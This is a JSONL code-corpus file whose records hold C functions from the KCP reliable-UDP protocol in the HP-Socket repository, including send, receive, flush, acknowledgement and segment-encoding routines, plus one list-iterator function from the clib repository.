{"docstring": "// write log\n", "func_signal": "void ikcp_log(ikcpcb *kcp, int mask, const char *fmt, ...)", "code": "{\n\tchar buffer[1024];\n\tva_list argptr;\n\tif ((mask & kcp->logmask) == 0 || kcp->writelog == 0) return;\n\tva_start(argptr, fmt);\n\tvsprintf(buffer, fmt, argptr);\n\tva_end(argptr);\n\tkcp->writelog(buffer, kcp, kcp->user);\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// Determine when should you invoke ikcp_update:\n// returns when you should invoke ikcp_update in millisec, if there \n// is no ikcp_input/_send calling. you can call ikcp_update in that\n// time, instead of call update repeatly.\n// Important to reduce unnacessary ikcp_update invoking. use it to \n// schedule ikcp_update (eg. implementing an epoll-like mechanism, \n// or optimize ikcp_update when handling massive kcp connections)\n//---------------------------------------------------------------------\n", "func_signal": "IUINT32 ikcp_check(const ikcpcb *kcp, IUINT32 current)", "code": "{\n\tIUINT32 ts_flush = kcp->ts_flush;\n\tIINT32 tm_flush = 0x7fffffff;\n\tIINT32 tm_packet = 0x7fffffff;\n\tIUINT32 minimal = 0;\n\tstruct IQUEUEHEAD *p;\n\n\tif (kcp->updated == 0) {\n\t\treturn current;\n\t}\n\n\tif (_itimediff(current, ts_flush) >= 10000 ||\n\t\t_itimediff(current, ts_flush) < -10000) {\n\t\tts_flush = current;\n\t}\n\n\tif (_itimediff(current, ts_flush) >= 0) {\n\t\treturn current;\n\t}\n\n\ttm_flush = _itimediff(ts_flush, current);\n\n\tfor (p = kcp->snd_buf.next; p != &kcp->snd_buf; p = p->next) {\n\t\tconst IKCPSEG *seg = iqueue_entry(p, const IKCPSEG, node);\n\t\tIINT32 diff = _itimediff(seg->resendts, current);\n\t\tif (diff <= 0) {\n\t\t\treturn current;\n\t\t}\n\t\tif (diff < tm_packet) tm_packet = diff;\n\t}\n\n\tminimal = (IUINT32)(tm_packet < tm_flush ? tm_packet : tm_flush);\n\tif (minimal >= kcp->interval) minimal = kcp->interval;\n\n\treturn current + minimal;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// check log mask\n", "func_signal": "static int ikcp_canlog(const ikcpcb *kcp, int mask)", "code": "{\n\tif ((mask & kcp->logmask) == 0 || kcp->writelog == NULL) return 0;\n\treturn 1;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// output segment\n", "func_signal": "static int ikcp_output(ikcpcb *kcp, const void *data, int size)", "code": "{\n\tassert(kcp);\n\tassert(kcp->output);\n\tif (ikcp_canlog(kcp, IKCP_LOG_OUTPUT)) {\n\t\tikcp_log(kcp, IKCP_LOG_OUTPUT, \"[RO] %ld bytes\", (long)size);\n\t}\n\tif (size == 0) return 0;\n\treturn kcp->output((const char*)data, size, kcp, kcp->user);\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "/* encode 8 bits unsigned int */\n", "func_signal": "static inline char *ikcp_encode8u(char *p, unsigned char c)", "code": "{\n\t*(unsigned char*)p++ = c;\n\treturn p;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// parse ack\n//---------------------------------------------------------------------\n", "func_signal": "static void ikcp_update_ack(ikcpcb *kcp, IINT32 rtt)", "code": "{\n\tIINT32 rto = 0;\n\tif (kcp->rx_srtt == 0) {\n\t\tkcp->rx_srtt = rtt;\n\t\tkcp->rx_rttval = rtt / 2;\n\t}\telse {\n\t\tlong delta = rtt - kcp->rx_srtt;\n\t\tif (delta < 0) delta = -delta;\n\t\tkcp->rx_rttval = (3 * kcp->rx_rttval + delta) / 4;\n\t\tkcp->rx_srtt = (7 * kcp->rx_srtt + rtt) / 8;\n\t\tif (kcp->rx_srtt < 1) kcp->rx_srtt = 1;\n\t}\n\trto = kcp->rx_srtt + _imax_(kcp->interval, 4 * kcp->rx_rttval);\n\tkcp->rx_rto = _ibound_(kcp->rx_minrto, rto, IKCP_RTO_MAX);\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// release a new kcpcb\n//---------------------------------------------------------------------\n", "func_signal": "void ikcp_release(ikcpcb *kcp)", "code": "{\n\tassert(kcp);\n\tif (kcp) {\n\t\tIKCPSEG *seg;\n\t\twhile (!iqueue_is_empty(&kcp->snd_buf)) {\n\t\t\tseg = iqueue_entry(kcp->snd_buf.next, IKCPSEG, node);\n\t\t\tiqueue_del(&seg->node);\n\t\t\tikcp_segment_delete(kcp, seg);\n\t\t}\n\t\twhile (!iqueue_is_empty(&kcp->rcv_buf)) {\n\t\t\tseg = iqueue_entry(kcp->rcv_buf.next, IKCPSEG, node);\n\t\t\tiqueue_del(&seg->node);\n\t\t\tikcp_segment_delete(kcp, seg);\n\t\t}\n\t\twhile (!iqueue_is_empty(&kcp->snd_queue)) {\n\t\t\tseg = iqueue_entry(kcp->snd_queue.next, IKCPSEG, node);\n\t\t\tiqueue_del(&seg->node);\n\t\t\tikcp_segment_delete(kcp, seg);\n\t\t}\n\t\twhile (!iqueue_is_empty(&kcp->rcv_queue)) {\n\t\t\tseg = iqueue_entry(kcp->rcv_queue.next, IKCPSEG, node);\n\t\t\tiqueue_del(&seg->node);\n\t\t\tikcp_segment_delete(kcp, seg);\n\t\t}\n\t\tif (kcp->buffer) {\n\t\t\tikcp_free(kcp->buffer);\n\t\t}\n\t\tif (kcp->acklist) {\n\t\t\tikcp_free(kcp->acklist);\n\t\t}\n\n\t\tkcp->nrcv_buf = 0;\n\t\tkcp->nsnd_buf = 0;\n\t\tkcp->nrcv_que = 0;\n\t\tkcp->nsnd_que = 0;\n\t\tkcp->ackcount = 0;\n\t\tkcp->buffer = NULL;\n\t\tkcp->acklist = NULL;\n\t\tikcp_free(kcp);\n\t}\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// internal free\n", "func_signal": "static void ikcp_free(void *ptr)", "code": "{\n\tif (ikcp_free_hook) {\n\t\tikcp_free_hook(ptr);\n\t}\telse {\n\t\tfree(ptr);\n\t}\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// user/upper level recv: returns size, returns below zero for EAGAIN\n//---------------------------------------------------------------------\n", "func_signal": "int ikcp_recv(ikcpcb *kcp, char *buffer, int len)", "code": "{\n\tstruct IQUEUEHEAD *p;\n\tint ispeek = (len < 0)? 1 : 0;\n\tint peeksize;\n\tint recover = 0;\n\tIKCPSEG *seg;\n\tassert(kcp);\n\n\tif (iqueue_is_empty(&kcp->rcv_queue))\n\t\treturn -1;\n\n\tif (len < 0) len = -len;\n\n\tpeeksize = ikcp_peeksize(kcp);\n\n\tif (peeksize < 0) \n\t\treturn -2;\n\n\tif (peeksize > len) \n\t\treturn -3;\n\n\tif (kcp->nrcv_que >= kcp->rcv_wnd)\n\t\trecover = 1;\n\n\t// merge fragment\n\tfor (len = 0, p = kcp->rcv_queue.next; p != &kcp->rcv_queue; ) {\n\t\tint fragment;\n\t\tseg = iqueue_entry(p, IKCPSEG, node);\n\t\tp = p->next;\n\n\t\tif (buffer) {\n\t\t\tmemcpy(buffer, seg->data, seg->len);\n\t\t\tbuffer += seg->len;\n\t\t}\n\n\t\tlen += seg->len;\n\t\tfragment = seg->frg;\n\n\t\tif (ikcp_canlog(kcp, IKCP_LOG_RECV)) {\n\t\t\tikcp_log(kcp, IKCP_LOG_RECV, \"recv sn=%lu\", (unsigned long)seg->sn);\n\t\t}\n\n\t\tif (ispeek == 0) {\n\t\t\tiqueue_del(&seg->node);\n\t\t\tikcp_segment_delete(kcp, seg);\n\t\t\tkcp->nrcv_que--;\n\t\t}\n\n\t\tif (fragment == 0) \n\t\t\tbreak;\n\t}\n\n\tassert(len == peeksize);\n\n\t// move available data from rcv_buf -> rcv_queue\n\twhile (! iqueue_is_empty(&kcp->rcv_buf)) {\n\t\tseg = iqueue_entry(kcp->rcv_buf.next, IKCPSEG, node);\n\t\tif (seg->sn == kcp->rcv_nxt && kcp->nrcv_que < kcp->rcv_wnd) {\n\t\t\tiqueue_del(&seg->node);\n\t\t\tkcp->nrcv_buf--;\n\t\t\tiqueue_add_tail(&seg->node, &kcp->rcv_queue);\n\t\t\tkcp->nrcv_que++;\n\t\t\tkcp->rcv_nxt++;\n\t\t}\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\t// fast recover\n\tif (kcp->nrcv_que < kcp->rcv_wnd && recover) {\n\t\t// ready to send back IKCP_CMD_WINS in ikcp_flush\n\t\t// tell remote my window size\n\t\tkcp->probe |= IKCP_ASK_TELL;\n\t}\n\n\treturn len;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// output queue\n", "func_signal": "void ikcp_qprint(const char *name, const struct IQUEUEHEAD *head)", "code": "{\n#if 0\n\tconst struct IQUEUEHEAD *p;\n\tprintf(\"<%s>: [\", name);\n\tfor (p = head->next; p != head; p = p->next) {\n\t\tconst IKCPSEG *seg = iqueue_entry(p, const IKCPSEG, node);\n\t\tprintf(\"(%lu %d)\", (unsigned long)seg->sn, (int)(seg->ts % 10000));\n\t\tif (p->next != head) printf(\",\");\n\t}\n\tprintf(\"]\\n\");\n#endif\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "/* decode 16 bits unsigned int (lsb) */\n", "func_signal": "static inline const char *ikcp_decode16u(const char *p, unsigned short *w)", "code": "{\n#if IWORDS_BIG_ENDIAN || IWORDS_MUST_ALIGN\n\t*w = *(const unsigned char*)(p + 1);\n\t*w = *(const unsigned char*)(p + 0) + (*w << 8);\n#else\n\t*w = *(const unsigned short*)p;\n#endif\n\tp += 2;\n\treturn p;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// read conv\n", "func_signal": "IUINT32 ikcp_getconv(const void *ptr)", "code": "{\n\tIUINT32 conv;\n\tikcp_decode32u((const char*)ptr, &conv);\n\treturn conv;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// parse data\n//---------------------------------------------------------------------\n", "func_signal": "void ikcp_parse_data(ikcpcb *kcp, IKCPSEG *newseg)", "code": "{\n\tstruct IQUEUEHEAD *p, *prev;\n\tIUINT32 sn = newseg->sn;\n\tint repeat = 0;\n\t\n\tif (_itimediff(sn, kcp->rcv_nxt + kcp->rcv_wnd) >= 0 ||\n\t\t_itimediff(sn, kcp->rcv_nxt) < 0) {\n\t\tikcp_segment_delete(kcp, newseg);\n\t\treturn;\n\t}\n\n\tfor (p = kcp->rcv_buf.prev; p != &kcp->rcv_buf; p = prev) {\n\t\tIKCPSEG *seg = iqueue_entry(p, IKCPSEG, node);\n\t\tprev = p->prev;\n\t\tif (seg->sn == sn) {\n\t\t\trepeat = 1;\n\t\t\tbreak;\n\t\t}\n\t\tif (_itimediff(sn, seg->sn) > 0) {\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tif (repeat == 0) {\n\t\tiqueue_init(&newseg->node);\n\t\tiqueue_add(&newseg->node, p);\n\t\tkcp->nrcv_buf++;\n\t}\telse {\n\t\tikcp_segment_delete(kcp, newseg);\n\t}\n\n#if 0\n\tikcp_qprint(\"rcvbuf\", &kcp->rcv_buf);\n\tprintf(\"rcv_nxt=%lu\\n\", kcp->rcv_nxt);\n#endif\n\n\t// move available data from rcv_buf -> rcv_queue\n\twhile (! iqueue_is_empty(&kcp->rcv_buf)) {\n\t\tIKCPSEG *seg = iqueue_entry(kcp->rcv_buf.next, IKCPSEG, node);\n\t\tif (seg->sn == kcp->rcv_nxt && kcp->nrcv_que < kcp->rcv_wnd) {\n\t\t\tiqueue_del(&seg->node);\n\t\t\tkcp->nrcv_buf--;\n\t\t\tiqueue_add_tail(&seg->node, &kcp->rcv_queue);\n\t\t\tkcp->nrcv_que++;\n\t\t\tkcp->rcv_nxt++;\n\t\t}\telse {\n\t\t\tbreak;\n\t\t}\n\t}\n\n#if 0\n\tikcp_qprint(\"queue\", &kcp->rcv_queue);\n\tprintf(\"rcv_nxt=%lu\\n\", kcp->rcv_nxt);\n#endif\n\n#if 1\n//\tprintf(\"snd(buf=%d, queue=%d)\\n\", kcp->nsnd_buf, kcp->nsnd_que);\n//\tprintf(\"rcv(buf=%d, queue=%d)\\n\", kcp->nrcv_buf, kcp->nrcv_que);\n#endif\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// update state (call it repeatedly, every 10ms-100ms), or you can ask \n// ikcp_check when to call it again (without ikcp_input/_send calling).\n// 'current' - current timestamp in millisec. \n//---------------------------------------------------------------------\n", "func_signal": "void ikcp_update(ikcpcb *kcp, IUINT32 current)", "code": "{\n\tIINT32 slap;\n\n\tkcp->current = current;\n\n\tif (kcp->updated == 0) {\n\t\tkcp->updated = 1;\n\t\tkcp->ts_flush = kcp->current;\n\t}\n\n\tslap = _itimediff(kcp->current, kcp->ts_flush);\n\n\tif (slap >= 10000 || slap < -10000) {\n\t\tkcp->ts_flush = kcp->current;\n\t\tslap = 0;\n\t}\n\n\tif (slap >= 0) {\n\t\tkcp->ts_flush += kcp->interval;\n\t\tif (_itimediff(kcp->current, kcp->ts_flush) >= 0) {\n\t\t\tkcp->ts_flush = kcp->current + kcp->interval;\n\t\t}\n\t\tikcp_flush(kcp);\n\t}\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// ikcp_flush\n//---------------------------------------------------------------------\n", "func_signal": "void ikcp_flush(ikcpcb *kcp)", "code": "{\n\tIUINT32 current = kcp->current;\n\tchar *buffer = kcp->buffer;\n\tchar *ptr = buffer;\n\tint count, size, i;\n\tIUINT32 resent, cwnd;\n\tIUINT32 rtomin;\n\tstruct IQUEUEHEAD *p;\n\tint change = 0;\n\tint lost = 0;\n\tIKCPSEG seg;\n\n\t// 'ikcp_update' haven't been called. \n\tif (kcp->updated == 0) return;\n\n\tseg.conv = kcp->conv;\n\tseg.cmd = IKCP_CMD_ACK;\n\tseg.frg = 0;\n\tseg.wnd = ikcp_wnd_unused(kcp);\n\tseg.una = kcp->rcv_nxt;\n\tseg.len = 0;\n\tseg.sn = 0;\n\tseg.ts = 0;\n\n\t// flush acknowledges\n\tcount = kcp->ackcount;\n\tfor (i = 0; i < count; i++) {\n\t\tsize = (int)(ptr - buffer);\n\t\tif (size + (int)IKCP_OVERHEAD > (int)kcp->mtu) {\n\t\t\tikcp_output(kcp, buffer, size);\n\t\t\tptr = buffer;\n\t\t}\n\t\tikcp_ack_get(kcp, i, &seg.sn, &seg.ts);\n\t\tptr = ikcp_encode_seg(ptr, &seg);\n\t}\n\n\tkcp->ackcount = 0;\n\n\t// probe window size (if remote window size equals zero)\n\tif (kcp->rmt_wnd == 0) {\n\t\tif (kcp->probe_wait == 0) {\n\t\t\tkcp->probe_wait = IKCP_PROBE_INIT;\n\t\t\tkcp->ts_probe = kcp->current + kcp->probe_wait;\n\t\t}\t\n\t\telse {\n\t\t\tif (_itimediff(kcp->current, kcp->ts_probe) >= 0) {\n\t\t\t\tif (kcp->probe_wait < IKCP_PROBE_INIT) \n\t\t\t\t\tkcp->probe_wait = IKCP_PROBE_INIT;\n\t\t\t\tkcp->probe_wait += kcp->probe_wait / 2;\n\t\t\t\tif (kcp->probe_wait > IKCP_PROBE_LIMIT)\n\t\t\t\t\tkcp->probe_wait = IKCP_PROBE_LIMIT;\n\t\t\t\tkcp->ts_probe = kcp->current + kcp->probe_wait;\n\t\t\t\tkcp->probe |= IKCP_ASK_SEND;\n\t\t\t}\n\t\t}\n\t}\telse {\n\t\tkcp->ts_probe = 0;\n\t\tkcp->probe_wait = 0;\n\t}\n\n\t// flush window probing commands\n\tif (kcp->probe & IKCP_ASK_SEND) {\n\t\tseg.cmd = IKCP_CMD_WASK;\n\t\tsize = (int)(ptr - buffer);\n\t\tif (size + (int)IKCP_OVERHEAD > (int)kcp->mtu) {\n\t\t\tikcp_output(kcp, buffer, size);\n\t\t\tptr = buffer;\n\t\t}\n\t\tptr = ikcp_encode_seg(ptr, &seg);\n\t}\n\n\t// flush window probing commands\n\tif (kcp->probe & IKCP_ASK_TELL) {\n\t\tseg.cmd = IKCP_CMD_WINS;\n\t\tsize = (int)(ptr - buffer);\n\t\tif (size + (int)IKCP_OVERHEAD > (int)kcp->mtu) {\n\t\t\tikcp_output(kcp, buffer, size);\n\t\t\tptr = buffer;\n\t\t}\n\t\tptr = ikcp_encode_seg(ptr, &seg);\n\t}\n\n\tkcp->probe = 0;\n\n\t// calculate window size\n\tcwnd = _imin_(kcp->snd_wnd, kcp->rmt_wnd);\n\tif (kcp->nocwnd == 0) cwnd = _imin_(kcp->cwnd, cwnd);\n\n\t// move data from snd_queue to snd_buf\n\twhile (_itimediff(kcp->snd_nxt, kcp->snd_una + cwnd) < 0) {\n\t\tIKCPSEG *newseg;\n\t\tif (iqueue_is_empty(&kcp->snd_queue)) break;\n\n\t\tnewseg = iqueue_entry(kcp->snd_queue.next, IKCPSEG, node);\n\n\t\tiqueue_del(&newseg->node);\n\t\tiqueue_add_tail(&newseg->node, &kcp->snd_buf);\n\t\tkcp->nsnd_que--;\n\t\tkcp->nsnd_buf++;\n\n\t\tnewseg->conv = kcp->conv;\n\t\tnewseg->cmd = IKCP_CMD_PUSH;\n\t\tnewseg->wnd = seg.wnd;\n\t\tnewseg->ts = current;\n\t\tnewseg->sn = kcp->snd_nxt++;\n\t\tnewseg->una = kcp->rcv_nxt;\n\t\tnewseg->resendts = current;\n\t\tnewseg->rto = kcp->rx_rto;\n\t\tnewseg->fastack = 0;\n\t\tnewseg->xmit = 0;\n\t}\n\n\t// calculate resent\n\tresent = (kcp->fastresend > 0)? (IUINT32)kcp->fastresend : 0xffffffff;\n\trtomin = (kcp->nodelay == 0)? (kcp->rx_rto >> 3) : 0;\n\n\t// flush data segments\n\tfor (p = kcp->snd_buf.next; p != &kcp->snd_buf; p = p->next) {\n\t\tIKCPSEG *segment = iqueue_entry(p, IKCPSEG, node);\n\t\tint needsend = 0;\n\t\tif (segment->xmit == 0) {\n\t\t\tneedsend = 1;\n\t\t\tsegment->xmit++;\n\t\t\tsegment->rto = kcp->rx_rto;\n\t\t\tsegment->resendts = current + segment->rto + rtomin;\n\t\t}\n\t\telse if (_itimediff(current, segment->resendts) >= 0) {\n\t\t\tneedsend = 1;\n\t\t\tsegment->xmit++;\n\t\t\tkcp->xmit++;\n\t\t\tif (kcp->nodelay == 0) {\n\t\t\t\tsegment->rto += _imax_(segment->rto, (IUINT32)kcp->rx_rto);\n\t\t\t}\telse {\n\t\t\t\tIINT32 step = (kcp->nodelay < 2)? \n\t\t\t\t\t((IINT32)(segment->rto)) : kcp->rx_rto;\n\t\t\t\tsegment->rto += step / 2;\n\t\t\t}\n\t\t\tsegment->resendts = current + segment->rto;\n\t\t\tlost = 1;\n\t\t}\n\t\telse if (segment->fastack >= resent) {\n\t\t\tif ((int)segment->xmit <= kcp->fastlimit || \n\t\t\t\tkcp->fastlimit <= 0) {\n\t\t\t\tneedsend = 1;\n\t\t\t\tsegment->xmit++;\n\t\t\t\tsegment->fastack = 0;\n\t\t\t\tsegment->resendts = current + segment->rto;\n\t\t\t\tchange++;\n\t\t\t}\n\t\t}\n\n\t\tif (needsend) {\n\t\t\tint need;\n\t\t\tsegment->ts = current;\n\t\t\tsegment->wnd = seg.wnd;\n\t\t\tsegment->una = kcp->rcv_nxt;\n\n\t\t\tsize = (int)(ptr - buffer);\n\t\t\tneed = IKCP_OVERHEAD + segment->len;\n\n\t\t\tif (size + need > (int)kcp->mtu) {\n\t\t\t\tikcp_output(kcp, buffer, size);\n\t\t\t\tptr = buffer;\n\t\t\t}\n\n\t\t\tptr = ikcp_encode_seg(ptr, segment);\n\n\t\t\tif (segment->len > 0) {\n\t\t\t\tmemcpy(ptr, segment->data, segment->len);\n\t\t\t\tptr += segment->len;\n\t\t\t}\n\n\t\t\tif (segment->xmit >= kcp->dead_link) {\n\t\t\t\tkcp->state = (IUINT32)-1;\n\t\t\t}\n\t\t}\n\t}\n\n\t// flash remain segments\n\tsize = (int)(ptr - buffer);\n\tif (size > 0) {\n\t\tikcp_output(kcp, buffer, size);\n\t}\n\n\t// update ssthresh\n\tif (change) {\n\t\tIUINT32 inflight = kcp->snd_nxt - kcp->snd_una;\n\t\tkcp->ssthresh = inflight / 2;\n\t\tif (kcp->ssthresh < IKCP_THRESH_MIN)\n\t\t\tkcp->ssthresh = IKCP_THRESH_MIN;\n\t\tkcp->cwnd = kcp->ssthresh + resent;\n\t\tkcp->incr = kcp->cwnd * kcp->mss;\n\t}\n\n\tif (lost) {\n\t\tkcp->ssthresh = cwnd / 2;\n\t\tif (kcp->ssthresh < IKCP_THRESH_MIN)\n\t\t\tkcp->ssthresh = IKCP_THRESH_MIN;\n\t\tkcp->cwnd = 1;\n\t\tkcp->incr = kcp->mss;\n\t}\n\n\tif (kcp->cwnd < 1) {\n\t\tkcp->cwnd = 1;\n\t\tkcp->incr = kcp->mss;\n\t}\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// user/upper level send, returns below zero for error\n//---------------------------------------------------------------------\n", "func_signal": "int ikcp_send(ikcpcb *kcp, const char *buffer, int len)", "code": "{\n\tIKCPSEG *seg;\n\tint count, i;\n\n\tassert(kcp->mss > 0);\n\tif (len < 0) return -1;\n\n\t// append to previous segment in streaming mode (if possible)\n\tif (kcp->stream != 0) {\n\t\tif (!iqueue_is_empty(&kcp->snd_queue)) {\n\t\t\tIKCPSEG *old = iqueue_entry(kcp->snd_queue.prev, IKCPSEG, node);\n\t\t\tif (old->len < kcp->mss) {\n\t\t\t\tint capacity = kcp->mss - old->len;\n\t\t\t\tint extend = (len < capacity)? len : capacity;\n\t\t\t\tseg = ikcp_segment_new(kcp, old->len + extend);\n\t\t\t\tassert(seg);\n\t\t\t\tif (seg == NULL) {\n\t\t\t\t\treturn -2;\n\t\t\t\t}\n\t\t\t\tiqueue_add_tail(&seg->node, &kcp->snd_queue);\n\t\t\t\tmemcpy(seg->data, old->data, old->len);\n\t\t\t\tif (buffer) {\n\t\t\t\t\tmemcpy(seg->data + old->len, buffer, extend);\n\t\t\t\t\tbuffer += extend;\n\t\t\t\t}\n\t\t\t\tseg->len = old->len + extend;\n\t\t\t\tseg->frg = 0;\n\t\t\t\tlen -= extend;\n\t\t\t\tiqueue_del_init(&old->node);\n\t\t\t\tikcp_segment_delete(kcp, old);\n\t\t\t}\n\t\t}\n\t\tif (len <= 0) {\n\t\t\treturn 0;\n\t\t}\n\t}\n\n\tif (len <= (int)kcp->mss) count = 1;\n\telse count = (len + kcp->mss - 1) / kcp->mss;\n\n\tif (count >= (int)IKCP_WND_RCV) return -2;\n\n\tif (count == 0) count = 1;\n\n\t// fragment\n\tfor (i = 0; i < count; i++) {\n\t\tint size = len > (int)kcp->mss ? (int)kcp->mss : len;\n\t\tseg = ikcp_segment_new(kcp, size);\n\t\tassert(seg);\n\t\tif (seg == NULL) {\n\t\t\treturn -2;\n\t\t}\n\t\tif (buffer && len > 0) {\n\t\t\tmemcpy(seg->data, buffer, size);\n\t\t}\n\t\tseg->len = size;\n\t\tseg->frg = (kcp->stream == 0)? (count - i - 1) : 0;\n\t\tiqueue_init(&seg->node);\n\t\tiqueue_add_tail(&seg->node, &kcp->snd_queue);\n\t\tkcp->nsnd_que++;\n\t\tif (buffer) {\n\t\t\tbuffer += size;\n\t\t}\n\t\tlen -= size;\n\t}\n\n\treturn 0;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// ack append\n//---------------------------------------------------------------------\n", "func_signal": "static void ikcp_ack_push(ikcpcb *kcp, IUINT32 sn, IUINT32 ts)", "code": "{\n\tIUINT32 newsize = kcp->ackcount + 1;\n\tIUINT32 *ptr;\n\n\tif (newsize > kcp->ackblock) {\n\t\tIUINT32 *acklist;\n\t\tIUINT32 newblock;\n\n\t\tfor (newblock = 8; newblock < newsize; newblock <<= 1);\n\t\tacklist = (IUINT32*)ikcp_malloc(newblock * sizeof(IUINT32) * 2);\n\n\t\tif (acklist == NULL) {\n\t\t\tassert(acklist != NULL);\n\t\t\tabort();\n\t\t}\n\n\t\tif (kcp->acklist != NULL) {\n\t\t\tIUINT32 x;\n\t\t\tfor (x = 0; x < kcp->ackcount; x++) {\n\t\t\t\tacklist[x * 2 + 0] = kcp->acklist[x * 2 + 0];\n\t\t\t\tacklist[x * 2 + 1] = kcp->acklist[x * 2 + 1];\n\t\t\t}\n\t\t\tikcp_free(kcp->acklist);\n\t\t}\n\n\t\tkcp->acklist = acklist;\n\t\tkcp->ackblock = newblock;\n\t}\n\n\tptr = &kcp->acklist[kcp->ackcount * 2];\n\tptr[0] = sn;\n\tptr[1] = ts;\n\tkcp->ackcount++;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "// redefine allocator\n", "func_signal": "void ikcp_allocator(void* (*new_malloc)(size_t), void (*new_free)(void*))", "code": "{\n\tikcp_malloc_hook = new_malloc;\n\tikcp_free_hook = new_free;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "//---------------------------------------------------------------------\n// ikcp_encode_seg\n//---------------------------------------------------------------------\n", "func_signal": "static char *ikcp_encode_seg(char *ptr, const IKCPSEG *seg)", "code": "{\n\tptr = ikcp_encode32u(ptr, seg->conv);\n\tptr = ikcp_encode8u(ptr, (IUINT8)seg->cmd);\n\tptr = ikcp_encode8u(ptr, (IUINT8)seg->frg);\n\tptr = ikcp_encode16u(ptr, (IUINT16)seg->wnd);\n\tptr = ikcp_encode32u(ptr, seg->ts);\n\tptr = ikcp_encode32u(ptr, seg->sn);\n\tptr = ikcp_encode32u(ptr, seg->una);\n\tptr = ikcp_encode32u(ptr, seg->len);\n\treturn ptr;\n}", "path": "HP-Socket/Linux/src/common/kcp/ikcp.c", "commit_date": "2020-11-21 00:00:00", "repo_name": "ldcsaa/HP-Socket", "stars": 5492, "license": "other", "language": "c", "size": 233450}
{"docstring": "/*\n * Return the next list_node_t or NULL when no more\n * nodes remain in the list.\n */\n", "func_signal": "list_node_t *\nlist_iterator_next(list_iterator_t *self)", "code": "{\n  list_node_t *curr = self->next;\n  if (curr) {\n    self->next = self->direction == LIST_HEAD\n      ? curr->next\n      : curr->prev;\n  }\n  return curr;\n}", "path": "clib/deps/list/list_iterator.c", "commit_date": "2014-06-26 00:00:00", "repo_name": "clibs/clib", "stars": 4701, "license": "mit", "language": "c", "size": 802}
